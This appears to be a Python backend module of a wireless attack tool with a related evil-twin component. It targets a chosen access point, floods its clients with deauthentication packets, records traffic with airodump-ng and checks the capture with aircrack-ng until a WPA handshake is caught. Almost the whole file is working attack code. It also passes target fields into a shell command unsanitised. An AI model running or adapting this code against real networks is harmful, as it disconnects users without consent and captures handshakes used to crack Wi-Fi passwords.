import os
import re
import time
import threading
import subprocess

import lib.eviltwin
from lib import settings
from lib.resp import Resp
from lib.accesspoints.backend import APs
from lib.handshake.deauth import Deauthenticate

class Target:
    def __init__(self, bssid, essid, chann, is_captured=False):
        self.bssid = bssid
        self.essid = essid
        self.chann = chann
        self.is_active = True
        self.is_captured = is_captured
        self.deauth = Deauthenticate(settings.DEAUTH_INTERFACE, bssid)

    @property
    def serialize(self):

        return {
            "bssid": self.bssid,
            "essid": self.essid,
            "chann": self.chann,
            "isActive": self.is_active,
            "isCaptured": self.is_captured,
        }


class HandshakeBackend:
    __target = None
    __target_lock = threading.RLock()
    __deauth_lock = threading.RLock()
    __is_attacking = False
    __airodump_process = None
    __accesspoint_details = APs(
        csv_file=f"{settings.HANDSHAKE_OUTPUT}-01.csv", is_single_ap=True
    )

    @staticmethod
    def get_target():
        with HandshakeBackend.__target_lock:
            return HandshakeBackend.__target

    @staticmethod
    def remove_output_files():
        n = 1

        while True:
            p1 = f"{settings.HANDSHAKE_OUTPUT}-{n:02}.csv"
            p2 = f"{settings.HANDSHAKE_OUTPUT}-{n:02}.cap"

            if not os.path.exists(p1):
                break

            os.remove(p1)

            if os.path.exists(p2):
                os.remove(p2)
            n += 1

    @staticmethod
    def get_details():
        resp = Resp()

        with HandshakeBackend.__target_lock:
            if not HandshakeBackend.__target:
                return resp

            if not HandshakeBackend.__target.is_captured:
                return resp

        return HandshakeBackend.__accesspoint_details.get_output()

    @staticmethod
    def __update_ap_info():
        ap = HandshakeBackend.__accesspoint_details.get_output().serialize[
            "value"
        ]

        ap = list(ap.values())

        if not len(ap):
            return

        ap = ap[0]
        target = Target(
            ap["bssid"], ap["essid"], ap["chann"], is_captured=True
        )

        with HandshakeBackend.__target_lock:
            HandshakeBackend.__target = target

    @staticmethod
    def __airodump_is_active():
        process = HandshakeBackend.__airodump_process
        return False if not process else process.poll() == None

    @staticmethod
    def __start_airodump():
        target = HandshakeBackend.__target
        output_file = settings.HANDSHAKE_OUTPUT
        interface = settings.HANDSHAKE_INTERFACE

        if not target:
            return

        HandshakeBackend.remove_output_files()

        cmd = f"airodump-ng -a --bssid {target.bssid} -c {target.chann} -w {output_file} --output-format cap,csv --ig {interface}"
        HandshakeBackend.__airodump_process = subprocess.Popen(
            cmd,
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT,
        )

        time.sleep(1.5)

    @staticmethod
    def __stop_airodump():
        process = HandshakeBackend.__airodump_process

        if not process or not HandshakeBackend.__airodump_is_active():
            return

        attempts = 10
        for _ in range(attempts):
            if not HandshakeBackend.__airodump_is_active():
                return

            HandshakeBackend.__airodump_process.kill()
            time.sleep(0.45)

    @staticmethod
    def __check_for_handshake():

        with HandshakeBackend.__target_lock:
            if not HandshakeBackend.__target:
                return

            if HandshakeBackend.__target.is_captured:
                return True

        result = subprocess.getoutput(
            f"aircrack-ng {settings.HANDSHAKE_OUTPUT}-01.cap"
        )

        is_captured = len(re.findall(r"[1-9]\shandshake", result)) != 0

        if is_captured:
            with HandshakeBackend.__target_lock:
                HandshakeBackend.__target.is_captured = True

        return is_captured

    @staticmethod
    def __attack():
        max_pkts = [96, 128, 256]
        ptr = 0

        while True:

            with HandshakeBackend.__target_lock:
                if not HandshakeBackend.__target:
                    break

                if (
                    not HandshakeBackend.__target.is_active
                    or HandshakeBackend.__target.is_captured
                ):
                    break

            for _ in range(max_pkts[ptr]):
                try:
                    HandshakeBackend.__target.deauth.sendp()
                except:
                    break

            ptr = ptr + 1 if ptr + 1 < len(max_pkts) else 0

            # Wait clients to reconnect
            for _ in range(60):
                time.sleep(0.5)

                with HandshakeBackend.__target_lock:
                    if not HandshakeBackend.__target:
                        break

                    if not HandshakeBackend.__target.is_active:
                        break

                if HandshakeBackend.__check_for_handshake():
                    HandshakeBackend.__update_ap_info()
                    HandshakeBackend.stop_process()
                    break

        with HandshakeBackend.__deauth_lock:
            HandshakeBackend.__is_attacking = False

    @staticmethod
    def __connected_clients_count():
        ap_list = (
            HandshakeBackend.__accesspoint_details.get_output().value.values()
        )

        if not len(ap_list):
            return 0

        return len(list(ap_list)[0]["clients"])

    @staticmethod
    def perform_attack():

        with HandshakeBackend.__deauth_lock:
            if HandshakeBackend.__is_attacking:
                return

        with HandshakeBackend.__target_lock:
            if not HandshakeBackend.__target:
                return

            if (
                not HandshakeBackend.__target.is_active
                or HandshakeBackend.__target.is_captured
            ):
                return

        with HandshakeBackend.__deauth_lock:
            HandshakeBackend.__is_attacking = True

        t = threading.Thread(target=HandshakeBackend.__attack, daemon=True)
        t.start()

    @staticmethod
    def start_process(bssid, essid, chann):
        resp = Resp()

        eviltwin_status = (
            lib.eviltwin.backend.EviltwinBackend.status().value.get(
                "eviltwin", None
            )
        )

        if eviltwin_status:
            if eviltwin_status.get("isActive", False):
                resp.msg = "Eviltwin is active, cannot start handshake"
                return resp

        if HandshakeBackend.__target and HandshakeBackend.__target.is_active:
            resp.msg = "Handshake process is already active"
            return resp

        with HandshakeBackend.__target_lock:
            HandshakeBackend.__target = Target(bssid, essid, chann)
        HandshakeBackend.__start_airodump()

        if not HandshakeBackend.__airodump_is_active():
            with HandshakeBackend.__target_lock:
                HandshakeBackend.__target = None
            resp.msg = "Failed to start handshake"
            return resp

        resp.value = {"target": HandshakeBackend.__target.serialize}
        resp.msg = "Handshake process started successfully"
        resp.status = Resp.SUCCESS_CODE
        return resp

    @staticmethod
    def stop_process():
        resp = Resp()

        # if not (HandshakeBackend.__target or HandshakeBackend.__airodump_is_active()):
        #     resp.status = Resp.SUCCESS_CODE
        #     resp.msg = 'Handshake process is already inactive'
        #     return resp

        if not (
            HandshakeBackend.__target or HandshakeBackend.__target.is_active
        ):
            resp.status = Resp.SUCCESS_CODE
            resp.msg = "Handshake process is already inactive"
            return resp

        HandshakeBackend.__stop_airodump()

        if HandshakeBackend.__airodump_is_active():
            resp.msg = "Failed to stop handshake process"
            return resp

        with HandshakeBackend.__target_lock:
            # HandshakeBackend.__target = None
            HandshakeBackend.__target.is_active = False
            HandshakeBackend.__airodump_process = None

        resp.msg = "Successfully stopped handshake process"
        resp.status = Resp.SUCCESS_CODE
        return resp

    @staticmethod
    def status():
        resp = Resp()
        status = {"target": None}

        with HandshakeBackend.__target_lock:
            if HandshakeBackend.__target:
                status["target"] = HandshakeBackend.__target.serialize

        resp.value = status
        resp.status = Resp.SUCCESS_CODE
        return resp
